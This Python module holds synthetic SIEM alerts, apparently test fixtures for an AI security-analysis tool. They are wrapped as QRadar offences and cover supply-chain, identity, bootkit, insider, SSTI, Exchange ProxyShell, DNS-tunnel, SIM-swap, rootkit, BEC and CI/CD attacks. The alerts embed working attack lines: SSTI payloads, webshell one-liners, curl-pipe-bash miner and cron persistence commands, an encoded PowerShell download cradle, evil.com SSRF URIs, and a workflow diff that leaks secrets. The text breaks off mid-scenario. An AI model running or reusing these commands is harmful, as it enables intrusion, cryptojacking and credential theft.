"""Sophisticated attack scenario payloads for /qradar/api/siem/scenarios.

Source: Faiz's hand-crafted multi-source attack narratives designed to
test capabilities no other AI security tool can match. Each scenario
exercises a specific analytical capability:

  S1 — Living-off-the-Land Supply Chain (5 alerts, 4 tools, 47 min)
  S2 — Identity Attack Chain: MFA fatigue → token theft → persistence
  S3 — UEFI Firmware Bootkit Persistence
  S4 — Insider Threat + Steganographic Exfiltration
  S5 — Zero-day SSTI → Webshell → Crypto Miner

Each raw alert (Proofpoint / Defender / CrowdStrike / Zscaler / Entra /
Eclypsium / Purview / WAF / CloudWatch) is wrapped as a QRadar offence
so OmniSense's existing QRadar ingestion script (act 636 / act 1456)
consumes it byte-identically — no Go-side script changes needed.

Stable offence IDs (90001-90013) so OmniSense's dedup-by-id logic
treats each replay as the same incident. To force re-ingest, bump the
``SCENARIO_ID_BASE`` constant or use ``?fresh=1`` query param.

Mock-source marker preserved per Pattern-11.
"""

from __future__ import annotations

import json
from typing import Any  # noqa: F401  — kept for backwards-compatible re-imports

from siemulator.config import MOCK_SOURCE  # noqa: F401  — re-exported for callers

SCENARIO_ID_BASE = 90_000


# ── Raw scenario payloads (parsed from the JSON strings) ─────────


def _j(s: str) -> dict:
    """Parse a JSON string, fail loud at module-load if malformed."""
    return json.loads(s)


_S1_A1 = _j(r"""
{
  "source": "Proofpoint TAP", "event_type": "MessagesDelivered",
  "timestamp": "2026-05-22T08:14:22Z", "severity": "Low", "confidence": 35,
  "message": {
    "from": "david.chen@partnertech.com",
    "to": ["procurement@acmecorp.com"],
    "subject": "Updated vendor agreement - Q2 pricing revision",
    "urls": [{"url": "https://partnertech-my.sharepoint.com/personal/d_chen/_layouts/15/download.aspx?UniqueId=7a2b3c4d-5e6f-7890-abcd-ef1234567890",
              "rewritten": true, "verdict": "clean"}],
    "threat_score": 15, "classification": "clean",
    "note": "Sender is a known contact — 47 previous emails in last 90 days. SPF=pass, DKIM=pass, DMARC=pass. Legitimate SharePoint sharing link from a verified partner."
  }
}
""")

_S1_A2 = _j(r"""
{
  "source": "Microsoft Defender for Endpoint", "event_type": "AlertEvidence",
  "timestamp": "2026-05-22T08:31:47Z", "severity": "Medium", "confidence": 55,
  "alert": {"name": "Suspicious file download from SharePoint",
            "category": "InitialAccess"},
  "device": {"hostname": "PROC-WS-0331", "ip": "10.10.15.31",
             "user": "ACMECORP\\s.rahman", "department": "Procurement",
             "risk_level": "Medium", "s3_score": 65},
  "file": {"name": "VendorAgreement_Q2_2026_PricingTool.exe",
           "sha256": "b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
           "signed": true, "signer": "PartnerTech Solutions Inc.",
           "certificate_valid": true,
           "note": "Binary is validly signed by known partner organization."},
  "process": {"parent": "chrome.exe"}
}
""")

_S1_A3 = _j(r"""
{
  "source": "CrowdStrike Falcon", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-05-22T08:32:14Z", "severity": "Medium", "confidence": 60,
  "detection": {"name": "Suspicious DLL Side-Loading",
                "description": "Signed binary loaded unsigned DLL from same directory",
                "technique": "T1574.002"},
  "host": {"hostname": "PROC-WS-0331", "ip": "10.10.15.31", "s3_score": 65},
  "user": {"username": "ACMECORP\\s.rahman", "department": "Procurement"},
  "process": {
    "name": "VendorAgreement_Q2_2026_PricingTool.exe",
    "sha256": "b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
    "signer": "PartnerTech Solutions Inc.",
    "loaded_dlls": [{"name": "version.dll", "path": "C:\\Users\\s.rahman\\Downloads\\version.dll",
                     "signed": false, "note": "DLL side-loaded from Downloads instead of System32"}],
    "children": [
      {"command_line": "cmd.exe /c schtasks /create /tn \"VendorPricingSync\" /tr \"C:\\Users\\s.rahman\\AppData\\Local\\VendorTools\\sync.exe\" /sc hourly /mo 1 /f",
       "note": "Hourly persistence task created"},
      {"command_line": "cmd.exe /c copy ...Downloads...PricingTool.exe ...AppData...sync.exe",
       "note": "Binary copied to persistent location"}
    ]
  }
}
""")

_S1_A4 = _j(r"""
{
  "source": "Microsoft Defender for Endpoint", "event_type": "AlertEvidence",
  "timestamp": "2026-05-22T08:47:33Z", "severity": "High", "confidence": 75,
  "alert": {"name": "Living-off-the-land binary used for reconnaissance",
            "category": "Discovery"},
  "device": {"hostname": "PROC-WS-0331", "user": "ACMECORP\\s.rahman"},
  "process_tree": [
    {"name": "sync.exe", "parent": "svchost.exe",
     "note": "Launched by Task Scheduler — hourly persistence task fired"},
    {"command_line": "cmd.exe /c systeminfo > si.txt"},
    {"command_line": "cmd.exe /c ipconfig /all > ip.txt"},
    {"command_line": "cmd.exe /c net group \"Domain Admins\" /domain > da.txt"},
    {"command_line": "cmd.exe /c nltest /dclist:acmecorp.local > dc.txt"},
    {"command_line": "cmd.exe /c net share > sh.txt"},
    {"command_line": "certutil.exe -urlcache -split -f http://10.10.15.31:8080/upload r.txt",
     "note": "LOLBin certutil for data exfil — Volt Typhoon TTP"}
  ]
}
""")

_S1_A5 = _j(r"""
{
  "source": "Zscaler ZIA", "event_type": "WebTransaction",
  "timestamp": "2026-05-22T09:01:15Z", "severity": "High", "confidence": 70,
  "transaction": {
    "user": "s.rahman@acmecorp.com", "device": "PROC-WS-0331",
    "url": "https://api.notion.com/v1/pages", "method": "POST",
    "request_size_bytes": 847291, "response_code": 200,
    "category": "Collaboration Tools", "action": "allowed",
    "note": "Unusual: s.rahman has never used Notion API before. Large POST (847KB) — content appears Base64-encoded data embedded in Notion page body. Known exfil technique abusing legitimate SaaS APIs to bypass DLP."
  },
  "threat_intel": {"url_verdict": "clean", "domain_verdict": "clean"}
}
""")


_S2 = _j(r"""
{
  "source": "Microsoft Entra ID Protection + Defender for Cloud Apps",
  "event_type": "IdentityAttackChain", "severity": "Critical",
  "timestamp_range": "2026-05-22T22:41:00Z to 2026-05-22T23:18:00Z",
  "target_user": {
    "upn": "maria.gonzalez@acmecorp.com", "display_name": "Maria Gonzalez",
    "title": "VP of Engineering", "mfa_method": "Microsoft Authenticator push",
    "privileged_roles": ["Global Reader", "Application Administrator"]
  },
  "events": [
    {"seq": 1, "type": "SignInAttempt", "result": "MFA_DENIED", "source_ip": "185.220.101.34", "location": "Frankfurt, Germany (Tor exit node)"},
    {"seq": 2, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 3, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 4, "type": "SignInAttempt", "result": "MFA_DENIED", "note": "Pause + 4th push — attacker waiting for fatigue"},
    {"seq": 5, "type": "SignInAttempt", "result": "MFA_DENIED"},
    {"seq": 6, "type": "PhishingEmail", "detail": "Email from 'it-helpdesk@acmecorp-support.com' subject 'MFA Alert: Verify Now' with fake MFA approval link"},
    {"seq": 7, "type": "SignInAttempt", "result": "SUCCESS", "token_type": "PrimaryRefreshToken", "note": "Phishing link auto-approved push — attacker has PRT"},
    {"seq": 8, "type": "ConditionalAccessBypass", "note": "PRT spoofed device compliance claim — bypassed CA policy"},
    {"seq": 9, "type": "MailboxRuleCreated", "detail": "Inbox rule moves security@acmecorp.com + 'compromised'/'unauthorized'/'suspicious activity' to RSS Feeds folder"},
    {"seq": 10, "type": "OAuthAppConsent", "app_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "publisher": "Unverified", "permissions": "Mail.ReadWrite, Files.ReadWrite.All, Sites.ReadWrite.All, Directory.Read.All, User.Read.All"},
    {"seq": 11, "type": "SharePointAccess", "detail": "OAuth app bulk-downloaded 47 confidential engineering docs (3.8GB) incl. architecture-roadmap-2027.pptx, salary-bands-engineering.xlsx, acquisition-target-analysis.pdf, source-code-review-audit.docx"},
    {"seq": 12, "type": "EmailForwardRule", "detail": "Auto-forward 'confidential'/'restricted'/'board'/'acquisition' → tech.backup.2026@proton.me"},
    {"seq": 13, "type": "AzureADRoleAssignment", "detail": "Exchange Administrator role assigned to malicious OAuth app's service principal — full tenant Exchange admin rights"}
  ]
}
""")


_S3 = _j(r"""
{
  "source": "Eclypsium Firmware Scanner", "event_type": "FirmwareAnomaly",
  "timestamp": "2026-05-22T14:33:27Z", "severity": "Critical", "confidence": 92,
  "device": {
    "hostname": "EXEC-WS-001", "user": "ACMECORP\\c.nakamura",
    "title": "Chief Technology Officer", "asset_criticality": "CRITICAL", "s3_score": 98,
    "secure_boot": "Enabled", "tpm_version": "2.0", "bios_vendor": "AMI", "bios_version": "F.52"
  },
  "findings": [
    {"type": "UEFI_MODIFICATION", "severity": "Critical",
     "detail": "Current firmware hash does not match vendor golden image. DXE driver region + NVRAM variables modified. DXE executes before OS — full hardware access, survives OS reinstall."},
    {"type": "SUSPICIOUS_DXE_DRIVER", "severity": "Critical",
     "detail": "Unknown DXE driver 'HwServiceDxe.efi' (not in vendor firmware). Hooks ExitBootServices to inject into Windows kernel. Matches BlackLotus/ESPecter UEFI bootkit profile."},
    {"type": "EFI_SYSTEM_PARTITION_MODIFIED", "severity": "High",
     "detail": "Unsigned bootloader \\EFI\\Microsoft\\Boot\\grubx64.efi in Microsoft boot path — hallmark of UEFI bootkit installation."},
    {"type": "SECURE_BOOT_BYPASS", "severity": "Critical",
     "detail": "Secure Boot enabled but DBX outdated (2025-03-15). CVE-2022-21894 'Baton Drop' + CVE-2023-24932 'BlackLotus' not revoked. Attacker used signed-vulnerable bootloader to load unsigned UEFI implant."}
  ],
  "timeline_context": {
    "last_clean_scan": "2026-04-15", "first_anomaly": "2026-05-22T14:33:27Z",
    "user_travel": "Attended Shenzhen conference May 10-17. Laptop on hotel WiFi.",
    "physical_access": "Laptop left in hotel room safe May 12 evening.",
    "recent_incidents": "Reported suspicious USB found inserted May 15 — removed + EDR-scanned (clean) but no firmware scan."
  }
}
""")


_S4 = _j(r"""
{
  "source": "Microsoft Purview DLP + UEBA", "event_type": "InsiderRiskAlert",
  "timestamp": "2026-05-22T16:45:00Z", "severity": "High", "confidence": 78,
  "risk_policy": "Data exfiltration by departing employee",
  "user": {
    "upn": "alex.petrov@acmecorp.com", "display_name": "Alex Petrov",
    "title": "Senior Machine Learning Engineer", "department": "AI Research",
    "tenure_years": 4.2, "hr_status": "NOTICE_PERIOD",
    "resignation_date": "2026-05-15", "last_day": "2026-06-14",
    "new_employer": "Unknown (LinkedIn 'Open to Work' since May 10)",
    "access_level": "L4 — proprietary ML models, training datasets, research IP"
  },
  "behavioral_indicators": [
    {"type": "ABNORMAL_ACCESS_PATTERN", "detail": "340 files accessed in ML model repo 23:00-03:00 (28.3x deviation from 12-files/day baseline)"},
    {"type": "SENSITIVE_DATA_DOWNLOAD", "detail": "Downloaded GPT-AcmeFinance-v3.safetensors (4.2GB), AcmeVision-ObjectDetect-v2.onnx (1.8GB), TrainingData-FinancialNER-2026.parquet (12.3GB) = 18.3GB classified IP"},
    {"type": "STEGANOGRAPHIC_EXFILTRATION", "detail": "Uploaded 847 high-res PNGs (6.7GB) to personal Flickr. LSB entropy 7.98 (normal photos 2.0-4.0; random data 8.0). ~4-5GB hidden via steganography — matches ML model weights volume.", "confidence_steganography": 96},
    {"type": "EVIDENCE_DESTRUCTION", "detail": "Ran 'cipher /w:Downloads' (secure wipe), cleared Chrome history, deleted FlickrUploader logs"}
  ],
  "non_compete": {"status": "Active", "scope": "ML/AI roles at competitors for 24 months",
                  "ip_assignment": "All work product ACMECORP property per employment agreement S 7.3"}
}
""")


_S5_A1 = _j(r"""
{
  "source": "AWS WAF", "event_type": "WAFBlock", "action": "BLOCK",
  "timestamp": "2026-05-22T03:14:22Z", "severity": "Medium",
  "request": {"method": "POST", "uri": "/api/v2/reports/generate",
              "source_ip": "103.145.22.87", "country": "VN",
              "body_preview": "{\"template\":\"{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}\",\"format\":\"pdf\"}",
              "rule_matched": "AWSManagedRulesKnownBadInputsRuleSet",
              "note": "SSTI attempt in report generation endpoint — WAF blocked"}
}
""")

_S5_A2 = _j(r"""
{
  "source": "AWS WAF", "event_type": "WAFAllow", "action": "ALLOW",
  "timestamp": "2026-05-22T03:22:47Z", "severity": "Low",
  "request": {"method": "POST", "uri": "/api/v2/reports/generate",
              "source_ip": "103.145.22.87", "country": "VN",
              "body_preview": "{\"template\":\"{{range.constructor(\\\"return this\\\")().process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}}\",\"format\":\"pdf\"}",
              "rule_matched": "NONE", "response_code": 200, "response_size_bytes": 4891,
              "note": "Same attacker IP, different SSTI payload BYPASSED WAF. 200 + 4.8KB response suggests /etc/passwd content leaked."}
}
""")

_S5_A3 = _j(r"""
{
  "source": "CrowdStrike Falcon (Container Sensor)", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-05-22T03:24:15Z", "severity": "Critical", "confidence": 90,
  "detection": {"name": "Web shell dropped via application exploit", "technique": "T1505.003"},
  "container": {"name": "reporting-api-7f8d9c", "k8s_namespace": "production",
                "k8s_pod": "reporting-api-7f8d9c-x9k2p", "node": "k8s-worker-07"},
  "process": {
    "name": "node",
    "children": [
      {"command_line": "sh -c echo '<?php system($_GET[\"c\"]); ?>' > /app/public/uploads/.health-check.php",
       "note": "PHP webshell written to uploads with hidden filename"},
      {"command_line": "sh -c curl -s http://103.145.22.87:8443/miner.tar.gz | tar xz -C /tmp/.cache/ && /tmp/.cache/xmrig -o pool.supportxmr.com:443 -u 49Uj...addr...REDACTED -p worker-acme-k8s-07 --tls --background",
       "note": "XMRig miner downloaded + executed. Worker name 'worker-acme-k8s-07' identifies victim."},
      {"command_line": "sh -c (crontab -l; echo '*/10 * * * * curl -s http://103.145.22.87:8443/update.sh | bash') | crontab -",
       "note": "Persistence via crontab — re-downloads update script every 10 min"}
    ]
  },
  "network": {"connections": [
    {"remote_ip": "103.145.22.87", "remote_port": 8443, "note": "C2/download server"},
    {"remote_ip": "pool.supportxmr.com", "remote_port": 443, "note": "XMRig mining pool"}
  ]}
}
""")

_S5_A4 = _j(r"""
{
  "source": "AWS CloudWatch", "event_type": "AnomalyDetection",
  "timestamp": "2026-05-22T04:15:00Z", "severity": "High",
  "anomaly": {
    "type": "CPU_SPIKE", "resource": "k8s-worker-07",
    "current_value": 98.7, "baseline_value": 23.4, "deviation_sigma": 8.2,
    "duration_minutes": 51,
    "note": "CPU 23%→99% at 03:24 (exactly when miner started). Production app response times: 120ms→4200ms."
  },
  "cost_impact": {"estimated_additional_cost_24h": 847.00, "estimated_monthly_impact": 25410.00}
}
""")


# ── v2 advanced test payloads (TEST A–J, 2026-06-01) ────────────────
# Source: SARA_Advanced_Test_Payloads_v2.py. Each tests a different
# capability — Kerberos / Exchange / DNS tunnel / SIM swap / Linux
# rootkit / BEC / CI-CD / medical OT / deepfake vishing / GPO abuse.

_TA = _j(r"""
{
  "source": "Microsoft Defender for Identity",
  "event_type": "SuspiciousActivity",
  "timestamp": "2026-06-01T02:33:17Z",
  "severity": "Critical", "confidence": 92,
  "alert": {"name": "Suspected Golden Ticket usage",
            "description": "TGT lifetime exceeds domain policy max (10h) by 87.6x (876h/36.5d). RC4-HMAC instead of AES256.",
            "technique": "T1558.001"},
  "source_device": {"hostname": "DEV-WS-0194", "ip": "10.10.22.94", "os": "Windows 11 Enterprise",
                    "domain": "ACMECORP", "last_logon_user": "ACMECORP\\t.williams", "department": "Software Development"},
  "ticket_details": {"ticket_type": "TGT", "target_domain": "acmecorp.local",
                     "encryption_type": "RC4-HMAC (0x17)", "domain_policy_encryption": "AES256-CTS-HMAC-SHA1-96 (0x12)",
                     "ticket_lifetime_hours": 876, "domain_max_ticket_lifetime_hours": 10,
                     "forged_username": "krbtgt",
                     "forged_sid": "S-1-5-21-3398765432-1234567890-9876543210-502",
                     "source_sid": "S-1-5-21-3398765432-1234567890-9876543210-1194",
                     "source_username": "t.williams",
                     "note": "krbtgt hash likely compromised via DCSync or NTDS.dit. Forged TGT grants domain-admin-equivalent for 36.5 days."},
  "lateral_movement_observed": [
    {"timestamp": "2026-06-01T02:34:02Z", "target": "FIN-DB-PRIMARY (10.10.8.10)", "service": "MSSQLSvc/...:1433", "result": "success"},
    {"timestamp": "2026-06-01T02:34:44Z", "target": "HR-FILESERVER (10.10.9.5)", "service": "cifs/...", "result": "success"},
    {"timestamp": "2026-06-01T02:35:21Z", "target": "DC-PRIMARY (10.10.1.1)", "service": "ldap/...", "result": "success"}
  ]
}
""")

_TB = _j(r"""
{
  "source": "CrowdStrike Falcon", "event_type": "DetectionSummaryEvent",
  "timestamp": "2026-06-01T04:18:33Z", "severity": "Critical", "confidence": 88,
  "detection": {"name": "Webshell Activity on Exchange Server",
                "description": "Suspicious process tree from w3wp.exe (IIS worker) on Exchange Server"},
  "host": {"hostname": "EXCH-01", "ip": "10.10.3.10", "os": "Windows Server 2019",
           "role": "Exchange Server 2019 CU12", "patch_level": "March 2024 SU",
           "domain": "ACMECORP", "s3_score": 95, "internet_facing": true},
  "process_tree": [
    {"name": "w3wp.exe", "pid": 4412, "user": "NT AUTHORITY\\SYSTEM",
     "command_line": "w3wp.exe -ap \"MSExchangeOWAAppPool\"", "note": "IIS worker for OWA"},
    {"name": "cmd.exe", "pid": 7891, "parent_pid": 4412, "command_line": "cmd.exe /c whoami"},
    {"name": "powershell.exe", "pid": 8012, "parent_pid": 4412,
     "command_line": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGwAbwBhAGQAJwApAA==",
     "note": "Base64 decodes to: iex (new-object net.webclient).downloadstring('http://198.51.100.77/load')"},
    {"name": "cmd.exe", "pid": 8145, "parent_pid": 4412,
     "command_line": "cmd.exe /c echo <%@ Page Language=\"JScript\"%><%eval(Request.Item[\"exec\"],\"unsafe\");%> > C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\4_0_30319\\error_page.aspx",
     "note": "JScript webshell written to Exchange web dir"},
    {"name": "net.exe", "pid": 8234, "parent_pid": 4412,
     "command_line": "net user backdoor P@ssw0rd2026! /add /domain"},
    {"name": "net.exe", "pid": 8267, "parent_pid": 4412,
     "command_line": "net group \"Exchange Organization Administrators\" backdoor /add /domain"}
  ],
  "iis_logs": {"suspicious_requests": [
    {"timestamp": "2026-06-01T04:17:55Z", "method": "GET",
     "uri": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com",
     "status": 200, "source_ip": "198.51.100.77", "note": "ProxyShell SSRF probe"},
    {"timestamp": "2026-06-01T04:18:12Z", "method": "POST",
     "uri": "/autodiscover/autodiscover.json?@evil.com/EWS/exchange.asmx?&Email=autodiscover/autodiscover.json%3f@evil.com",
     "status": 200, "source_ip": "198.51.100.77", "note": "ProxyShell exploit → EWS mailbox access"}
  ]},
  "network": {"outbound_connections": [
    {"dst_ip": "198.51.100.77", "dst_port": 80, "protocol": "HTTP", "note": "C2 download"},
    {"dst_ip": "198.51.100.77", "dst_port": 443, "protocol": "HTTPS", "note": "C2 callback"}
  ]}
}
""")

_TC = _j(r"""
{
  "source": "Infoblox BloxOne Threat Defense", "event_type": "DNSExfiltrationDetected",
  "timestamp": "2026-06-01T11:22:45Z", "severity": "High", "confidence": 82,
  "alert": {"name": "DNS Tunneling Activity Detected",
            "description": "High-entropy DNS queries with abnormal subdomain length and frequency"},
  "source_device": {"hostname": "ENG-WS-0455", "ip": "10.10.20.55",
                    "user": "ACMECORP\\j.park", "department": "Engineering", "os": "macOS Sequoia 16.1"},
  "dns_analysis": {
    "query_domain": "t1.data.update-check-cdn.net",
    "authoritative_ns": "ns1.update-check-cdn.net (45.77.65.211)",
    "query_patterns": {
      "sample_queries": ["dGhpcyBpcyB0ZXN0.t1.data.update-check-cdn.net",
                         "IGRhdGEgZm9yIGV4.t1.data.update-check-cdn.net",
                         "ZmlsdHJhdGlvbiB2.t1.data.update-check-cdn.net",
                         "aWEgRE5TIHR1bm5l.t1.data.update-check-cdn.net",
                         "bGluZyBjaGFubmVs.t1.data.update-check-cdn.net"],
      "subdomain_avg_length": 28, "normal_subdomain_avg_length": 8,
      "subdomain_entropy": 4.8, "normal_subdomain_entropy": 2.1,
      "query_frequency_per_minute": 47, "normal_frequency_per_minute": 3,
      "total_queries_1hr": 2847, "estimated_data_exfiltrated_mb": 12.4,
      "query_type": "TXT",
      "note": "Subdomains are Base64 chunks ~45 bytes each. At 47 q/min ≈ 2KB/s exfil rate."
    },
    "domain_registration": {"domain": "update-check-cdn.net", "registrar": "Namecheap",
                            "registration_date": "2026-05-28", "registrant": "WHOIS Privacy",
                            "age_days": 4, "note": "Domain registered 4 days ago"}
  },
  "process_context": {"process": "dnscat2", "pid": 44892,
                      "path": "/Users/j.park/.local/bin/dnscat2",
                      "parent": "bash", "grandparent": "Terminal.app",
                      "command_line": "dnscat2 --dns server=update-check-cdn.net,port=53 --secret=AcmeExfil2026",
                      "started": "2026-06-01T10:45:00Z",
                      "note": "dnscat2 — open-source DNS tunneling tool; --secret = encrypted tunnel"}
}
""")

_TD = _j(r"""
{
  "source": "Okta System Log + Twilio Verify", "event_type": "IdentityCompromise",
  "timestamp": "2026-06-01T19:33:00Z", "severity": "Critical", "confidence": 85,
  "target_user": {"email": "cto@acmecorp.com", "display_name": "Sarah Chen", "title": "Chief Technology Officer",
                  "mfa_methods": ["SMS (+1-415-555-0187)", "Okta Verify Push"],
                  "last_successful_login": "2026-06-01T08:22:00Z", "login_location": "San Francisco, CA"},
  "events": [
    {"sequence": 1, "timestamp": "2026-06-01T19:33:00Z", "source": "Twilio Verify",
     "type": "SMS_DELIVERY_FAILURE",
     "detail": "SMS to +1-415-555-0187 failed — carrier reports 'number not in service'. Last delivery 11h ago.",
     "note": "Sudden SMS failure → SIM swap"},
    {"sequence": 2, "timestamp": "2026-06-01T19:33:45Z", "source": "Okta", "type": "LOGIN_ATTEMPT",
     "result": "MFA_CHALLENGE_SMS", "source_ip": "104.28.55.101", "location": "Miami, FL",
     "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)",
     "note": "Login from Miami while last login from SF; MFA via SMS — attacker has the SIM"},
    {"sequence": 3, "timestamp": "2026-06-01T19:34:12Z", "source": "Twilio Verify", "type": "SMS_OTP_DELIVERED",
     "detail": "OTP delivered to +1-415-555-0187 but IMEI changed. New IMEI: 354847291034567",
     "note": "OTP to attacker's device after SIM swap"},
    {"sequence": 4, "timestamp": "2026-06-01T19:34:33Z", "source": "Okta", "type": "LOGIN_SUCCESS",
     "result": "MFA_VERIFIED_SMS", "source_ip": "104.28.55.101", "session_token": "session_a7b3c9d2e4f1"},
    {"sequence": 5, "timestamp": "2026-06-01T19:36:00Z", "source": "Okta", "type": "MFA_FACTOR_RESET",
     "detail": "All MFA factors reset. Okta Verify Push removed. New authenticator enrolled from IMEI 354847291034567.",
     "note": "Attacker locks out real user"},
    {"sequence": 6, "timestamp": "2026-06-01T19:38:22Z", "source": "Okta", "type": "ADMIN_ROLE_ASSIGNED",
     "detail": "cto@acmecorp.com granted 'Super Administrator'. Previous: 'Read-Only Administrator'.",
     "source_ip": "104.28.55.101", "note": "Privilege escalation"},
    {"sequence": 7, "timestamp": "2026-06-01T19:40:15Z", "source": "Okta", "type": "POLICY_MODIFIED",
     "detail": "Session lifetime 8h→720h (30d). MFA re-prompt 'every login'→'every 30 days'.",
     "note": "Weakening security for persistence"},
    {"sequence": 8, "timestamp": "2026-06-01T19:42:00Z", "source": "AWS CloudTrail", "type": "FEDERATED_LOGIN",
     "detail": "Federated AWS Console login via Okta SSO. Assumed role: AWSAdministratorAccess. Region: us-east-1.",
     "source_ip": "104.28.55.101", "note": "Full AWS admin via Okta federation"}
  ]
}
""")

_TE = _j(r"""
{
  "source": "OSSEC HIDS", "event_type": "RootkitDetection",
  "timestamp": "2026-06-01T06:15:33Z", "severity": "Critical", "confidence": 90,
  "host": {"hostname": "web-prod-03", "ip": "10.10.50.3", "os": "Ubuntu 22.04 LTS",
           "kernel": "5.15.0-91-generic", "role": "Production Web Server (nginx + Node.js API)",
           "uptime_days": 127, "last_patched": "2026-04-10"},
  "findings": [
    {"type": "HIDDEN_PROCESS",
     "detail": "Process not in /proc but found via /dev/kmem. PID 31337 as root. Binary: /usr/lib/systemd/.sd-pam-helper",
     "ps_visible": false, "proc_visible": false, "kmem_visible": true,
     "network_connections": [{"remote_ip": "91.215.85.104", "remote_port": 443, "protocol": "TCP", "state": "ESTABLISHED"}]},
    {"type": "KERNEL_MODULE_ANOMALY",
     "detail": "Module 'netfilter_helper' not in /lib/modules/ or package mgr. Hooks getdents64, kill, read.",
     "module_name": "netfilter_helper",
     "module_hash": "d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6a7b8c9",
     "hooked_syscalls": ["sys_getdents64", "sys_kill", "sys_read"],
     "in_package_manager": false,
     "note": "Hooking getdents64 hides files; sys_read filters /proc; LKM rootkit."},
    {"type": "HIDDEN_FILES",
     "detail": "Hidden from userspace but visible via direct disk read.",
     "hidden_files": [
       {"path": "/usr/lib/systemd/.sd-pam-helper", "size_kb": 284, "type": "ELF x86_64"},
       {"path": "/usr/lib/systemd/.sd-pam-helper.conf", "size_kb": 2, "type": "text/plain"},
       {"path": "/var/log/.journal-audit", "size_kb": 48128, "type": "data (encrypted)"}
     ]},
    {"type": "TIMESTAMP_MANIPULATION",
     "detail": "Files show 2024-01-15 but ext4 crtime = 2026-05-18T03:22:44Z",
     "displayed_time": "2024-01-15T00:00:00Z", "actual_crtime": "2026-05-18T03:22:44Z",
     "note": "Timestomping — touch -r from legit systemd files"},
    {"type": "SSH_KEY_INJECTION",
     "detail": "Unauthorized SSH key in /root/.ssh/authorized_keys",
     "key_fingerprint": "SHA256:nThBg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8",
     "key_comment": "maintenance@internal", "note": "Persistence via SSH key"}
  ]
}
""")

_TF = _j(r"""
{
  "source": "Microsoft Defender for Office 365", "event_type": "PhishingDetection",
  "timestamp": "2026-06-01T14:22:00Z", "severity": "High", "confidence": 72,
  "email": {
    "from": {"display_name": "James Morrison (CEO)", "address": "james.morrison@acmecorp.co",
             "note": "Legit CEO email = .COM, this uses .CO (Colombia TLD)"},
    "reply_to": "jmorrison.private@gmail.com",
    "to": "accounts.payable@acmecorp.com",
    "subject": "Urgent Wire Transfer — Confidential",
    "authentication": {"spf": "pass (acmecorp.co)", "dkim": "pass (acmecorp.co)", "dmarc": "pass (acmecorp.co)"},
    "headers": {"x_mailer": "Apple Mail (2658.1)", "x_originating_ip": "none",
                "received_from": "mail-yw1-f175.google.com (Gmail relay)"},
    "body_text": "Hi Team,\n\nI need a wire transfer processed today — related to the acquisition we discussed at last week's board meeting. Time-sensitive and confidential, please don't discuss outside this thread.\n\nVendor: Meridian Strategic Partners LLC\nBank: JPMorgan Chase\nRouting: 021000021\nAccount: 7783924156\nAmount: $347,000.00\nReference: Project Falcon - Phase 2 Advisory Fee\n\nProcess before 3pm EST and confirm to my personal email (reply-to) since I'm traveling and corp email has sync issues.\n\nThanks,\nJames\n— Sent from my iPhone",
    "attachments": [], "urls": []
  },
  "context": {"ceo_real_email": "james.morrison@acmecorp.com",
              "ceo_current_status": "CEO is traveling internationally this week (confirmed by EA)",
              "board_meeting": "Board meeting last week — acquisition discussions confirmed",
              "vendor_lookup": "Meridian Strategic Partners LLC — no prior invoices or vendor records in AP",
              "note": "Sophisticated BEC: insider knowledge of board, CEO travel, org structure. No URLs/attachments — pure social engineering."}
}
""")

_TG = _j(r"""
{
  "source": "GitHub Advanced Security + Falco", "event_type": "CICDCompromise",
  "timestamp": "2026-06-01T09:15:00Z", "severity": "Critical", "confidence": 88,
  "repository": {"name": "acmecorp/payment-service", "visibility": "private", "branch": "main",
                 "protection_rules": "Require 2 approvals, status checks, no force push",
                 "last_clean_build": "2026-05-31T18:00:00Z"},
  "events": [
    {"sequence": 1, "timestamp": "2026-06-01T09:12:00Z", "type": "WORKFLOW_MODIFIED",
     "detail": ".github/workflows/deploy.yml modified by 'renovate-bot[bot]'. Added 'cache-optimization' step before build.",
     "diff": "+ - name: Cache optimization\n+   run: |\n+     curl -sSL https://npm-cache-optimize.dev/v2/setup.sh | bash\n+     echo \"CACHE_TOKEN=${{ secrets.NPM_TOKEN }}\" >> $GITHUB_ENV\n+     echo \"DEPLOY_KEY=${{ secrets.AWS_DEPLOY_KEY }}\" >> $GITHUB_ENV",
     "note": "Renovate Bot only modifies package.json/lock — never workflow files. This is impersonation."},
    {"sequence": 2, "timestamp": "2026-06-01T09:15:00Z", "type": "WORKFLOW_EXECUTION",
     "detail": "deploy.yml triggered. cache-optimization step ran. External script downloaded + executed.",
     "secrets_exposed": ["NPM_TOKEN", "AWS_DEPLOY_KEY"], "runner": "ubuntu-latest (GitHub-hosted)",
     "note": "curl|bash pattern in CI with secrets exposed"},
    {"sequence": 3, "timestamp": "2026-06-01T09:15:22Z", "type": "SECRET_EXFILTRATION",
     "detail": "DNS TXT query from runner to npm-cache-optimize.dev with Base64 NPM_TOKEN + AWS_DEPLOY_KEY",
     "exfiltrated_secrets": ["NPM_TOKEN", "AWS_DEPLOY_KEY"], "exfil_method": "DNS TXT query"},
    {"sequence": 4, "timestamp": "2026-06-01T09:18:44Z", "type": "NPM_PACKAGE_PUBLISHED",
